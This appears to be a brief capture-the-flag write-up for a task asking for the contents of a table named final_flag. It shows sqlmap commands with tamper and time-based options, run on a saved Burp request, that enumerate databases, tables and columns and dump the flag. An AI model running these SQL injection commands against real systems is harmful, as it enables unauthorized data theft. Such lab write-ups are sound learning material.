### What's the contents of table final_flag?
![](Screenshot%202026-06-24%20at%2018.08.34.png)

```shell
nano req.txt
```

Then paste the result of burp into `req.txt`

```shell
sqlmap -r req.txt --tamper=between --hex --time-sec=10 --threads=1 --level=5 --risk=3 --dbs --batch
```
![](Screenshot%202026-06-24%20at%2022.39.56.png)

```shell
sqlmap -r req.txt --tamper=between --hex --time-sec=10 --threads=1 --level=5 --risk=3 -D production --tables
```
![](Screenshot%202026-06-24%20at%2023.00.46.png)

```shell
sqlmap -r req.txt --tamper=between --hex --time-sec=10 -D production --batch -T final_flag --threads=1 --columns
```
![](Screenshot%202026-06-24%20at%2023.27.30.png)

```shell
sqlmap -r req.txt --tamper=between --hex --time-sec=10 -D production -T final_flag -C content --threads=1 --batch --dump
```
![](Screenshot%202026-06-25%20at%2000.03.45.png)
